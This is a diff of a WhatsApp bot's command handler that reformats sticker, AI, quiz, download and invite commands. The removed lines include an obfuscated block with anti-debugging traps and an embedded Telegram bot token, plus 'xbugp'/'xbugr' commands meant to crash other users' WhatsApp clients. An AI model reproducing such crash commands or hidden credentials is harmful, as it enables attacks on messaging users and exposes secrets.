-                slow: false,
-                host: "https://translate.google.com",
-            })
-            return GODincBOT.sendMessage(m.chat, {
-                audio: {
-                    url: GODrl,
-                },
-                mimetype: 'audio/mp4',
-                ptt: true,
-                fileName: `${text}.mp3`,
-            }, {
-                quoted: m,
-            })
-        }
-        break
-        case 'telestick': { //credit agan
-        	if (m.isGroup) return GODStickPrivate()
-        if (!isPrem) return replyprem(mess.premium)
-function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await GODincBOT[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
-        }
-    break
-    case 'fact': {
-    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
-        return replygcGOD(`${themeemoji} *Fact:* ${data.fact}\n`)   
-    }
-    break
-    case 'ai': case 'openai':
-try {
+let texttts = text
+const GODrl = googleTTS.getAudioUrl(texttts, {
+lang: "en",
+slow: false,
+host: "https://translate.google.com",
+})
+return GODincBOT.sendMessage(m.chat, {
+audio: {
+url: GODrl,
+},
+mimetype: 'audio/mp4',
+ptt: true,
+fileName: `${text}.mp3`,
+}, {
+quoted: m,
+})
+}
+break
+case 'telestick': { //credit agan
+if (m.isGroup) return GODStickPrivate()
+if (!isPrem) return replyprem(mess.premium)
+if (!text)  return m.reply("Some message to guide the user about providing sticker URL..."); 
+let stickerId = text.split("something")[1]; 
+const response = await fetchJson('https://api.telegram.org/botTOKEN/getStickerSet?name=' + encodeURIComponent(stickerId));
+if (response.result.is_animated) return m.reply("Some error message about unsupported stickers");
+m.reply('Total stickers: ' + response.result.stickers.length + ' ... '); 
+for (let sticker of response.result.stickers) {
+let stickerData = await fetchJson('API URL' + sticker.file_id);
+let stickerBuffer = await getBuffer('API URL' + stickerData.result.file_path);
+await GODincBOT.sendImage(m.chat, stickerBuffer, m, {
+'packname': global.packname,
+'author': m.pushName
+});
+sleep(1500); // Pausing for 1.5 seconds between each sticker sent.
+}
+}
+break
+case 'fact': {
+const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
+return replygcGOD(`${themeemoji} *Fact:* ${data.fact}\n`)   
+}
+break
+case 'ai': case 'openai':{
 if (global.keyopenai === '') return replygcGOD("Api key limi exceeded");
 if (!q) return replygcGOD(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
 const { Configuration, OpenAIApi } = require('openai')
@@ -6215,11 +5895,10 @@ replygcGOD("Sorry, there seems to be an error :"+ error.message);
 }
 }
 break
-case "aimage":
-try {
-if (global.keyopenai === '') return replygcGOD("Apikey limit exceeded");
-if (!q) return replygcGOD(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
-const { Configuration, OpenAIApi } = require('openai')
+case "aimage": {
+if (global.keyopenai === '') return replygcGOD("Apikey limit exceeded");        
+if (!text) return replygcGOD(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`);
+const { Configuration, OpenAIApi } = require('openai');
 const configuration = new Configuration({
 apiKey: global.keyopenai,
 });
@@ -6229,46 +5908,44 @@ prompt: text,
 n: 1,
 size: "512x512",
 });
-//console.log(response.data.data[0].url)
-GODincBOT.sendImage(from, response.data.data[0].url, text, m);
+GODincBOT.sendImage(from, response.data.data[0].url, q, m);
 } catch (err) {
 console.log(err);
-replygcGOD("Sorry, there seems to be an error :"+ err);
+replygcGOD("Sorry, there seems to be an error: " + err);
 }
 break
-		
 case 'myip': {
-        if (!GODTheCreator) return GODStickOwner()
-        if (m.isGroup) return GODStickPrivate()
-                var http = require('http')
-                http.get({
-                    'host': 'api.ipify.org',
-                    'port': 80,
-                    'path': '/'
-                }, function(resp) {
-                    resp.on('data', function(ip) {
-                        replygcGOD("🔎 My public IP address is: " + ip)
-                    })
-                })
-            }
-        break
-        case 'mathquiz': case 'math': {
-                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
-                let { genMath, modes } = require('./lib/math')
-                if (!text) return replygcGOD(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
-                let result = await genMath(text.toLowerCase())
-                GODincBOT.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
-                    kuismath[m.sender.split('@')[0]] = result.jawaban
-                })
-                await sleep(result.waktu)
-                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
-                    console.log("Answer: " + result.jawaban)
-                    replygcGOD("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
-                    delete kuismath[m.sender.split('@')[0]]
-                }
-            }
-            break
-            case 'lyrics': {
+if (!GODTheCreator) return GODStickOwner()
+if (m.isGroup) return GODStickPrivate()
+var http = require('http')
+http.get({
+'host': 'api.ipify.org',
+'port': 80,
+'path': '/'
+}, function(resp) {
+resp.on('data', function(ip) {
+replygcGOD("🔎 My public IP address is: " + ip)
+})
+})
+}
+break
+case 'mathquiz': case 'math': {
+if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let { genMath, modes } = require('./lib/math')
+if (!text) return replygcGOD(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
+let result = await genMath(text.toLowerCase())
+GODincBOT.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
+kuismath[m.sender.split('@')[0]] = result.jawaban
+})
+await sleep(result.waktu)
+if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+replygcGOD("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
+delete kuismath[m.sender.split('@')[0]]
+}
+}
+break
+case 'lyrics': {
 if (!text) return replygcGOD(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
 GODStickWait()
 const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
@@ -6284,25 +5961,25 @@ replygcGOD(`
 }
 break
 case 'gdrive': {
-		if (!args[0]) return replygcGOD(`Enter the Google Drive link`)
-	GODStickWait()
-	const fg = require('api-dylux')
-	try {
-	let res = await fg.GDriveDl(args[0])
-	 await replygcGOD(`
+if (!args[0]) return replygcGOD(`Enter the Google Drive link`)
+GODStickWait()
+const fg = require('api-dylux')
+try {
+let res = await fg.GDriveDl(args[0])
+await replygcGOD(`
 ≡ *Google Drive DL*
 ▢ *Nama:* ${res.fileName}
 ▢ *Size:* ${res.fileSize}
 ▢ *Type:* ${res.mimetype}`)
-	GODincBOT.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
-   } catch {
-	replygcGOD('Error: Check link or try another link') 
-  }
+GODincBOT.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
+} catch {
+replygcGOD('Error: Check link or try another link') 
+}
 }
 break
 case 'invite': {
-	if (!m.isGroup) return GODStickGroup()
-	if (!isBotAdmins) return GODStickBotAdmin()
+if (!m.isGroup) return GODStickGroup()
+if (!isBotAdmins) return GODStickBotAdmin()
 if (!text) return replygcGOD(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 918130784851`)
 if (text.includes('+')) return replygcGOD(`Enter the number together without *+*`)
 if (isNaN(text)) return replygcGOD(`Enter only the numbers plus your country code without spaces`)
@@ -6312,36 +5989,8 @@ let link = 'https://chat.whatsapp.com/' + await GODincBOT.groupInviteCode(group)
         replygcGOD(` An invite link is sent to the user`) 
 }
 break
-case "xnxxdl": {
-	if (!isPrem) return replyprem(mess.premium)
-	if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-	if (!text) return replygcGOD(`Enter Url`)
-        if (!text.includes('xnxx.com')) return replygcGOD(`Enter an xnxx link`)
-        GODStickWait()
-        const fg = require('api-dylux')
-            let xn = await fg.xnxxdl(text)
-GODincBOT.sendMessage(m.chat, { caption: `≡  *XNXX DL*
-        
-▢ *📌Title*: ${xn.result.title}
-▢ *⌚Duration:* ${xn.result.duration}
-▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
-}
-break
-case 'xnxxsearch': {
-	if (!isPrem) return replyprem(mess.premium)
-	if (!m.isGroup) return GODStickGroup()
-	if (!AntiNsfw) return replygcGOD(mess.nsfw)
-	if (!text) return replygcGOD(`Enter Query`)
-	GODStickWait()
-	const fg = require('api-dylux')
-	let res = await fg.xnxxSearch(text)
-            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
-              if (res.status) replygcGOD(ff)
-              }
-              break
-              case 'pinterest': {
-              	if (!text) return replygcGOD(`Enter Query`)
+case 'pinterest': {
+if (!text) return replygcGOD(`Enter Query`)
 GODStickWait()
 let { pinterest } = require('./lib/scraper')
 anutrest = await pinterest(text)
@@ -6559,30 +6208,7 @@ var inputnumber = text.split(" ")[0]
         replygcGOD(`${text66}${nobio}${nowhatsapp}`)
         }
 break
-	//bug && war cases
-case 'xbugp' : { //crashes mod whatsapps
-if (!GODTheCreator) return GODStickOwner()
-if (!text) return replygcGOD(`Example : ${prefix + command} GOD bihari😂`)
-const { GODorwot } = require('./XBug/GODbut2')
-let teks = `${text}`
-{
-GODincBOT.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${GODorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA GOD`,"body": ` ${GODytimewisher} my friend ${pushname}`,
-mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${GODorwot}`,
-showAdAttribution: true,
-sourceUrl: websitex,
-thumbnailUrl: thumb, 
-}
-}}}}}, { quoted:m})
-}
-}
-break
-case 'xbugr':{ //crashes both mod and playstore wa
-if (!GODTheCreator) return GODStickOwner()
-const { GODorwot } = require('./XBug/GODbut2')
-let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-GODincBOT.relayMessage(m.chat, { reactionMessage }, { messageId: '👑' })
-}
-break
+   //PROMOTION // 
 case 'accountsell' : case 'coursesell' :{
 let im = ["https://media.tenor.com/a3Pfq5kkcYIAAAAM/dinheiro-money.gif" ]
 let toa = `TELEGRAM CHANNEL : https://t.me/HACKERGuru2\n\nWHATSAPP GROUP : https://chat.whatsapp.com/H2yL8sXuUsd2K1wuYydjnb `
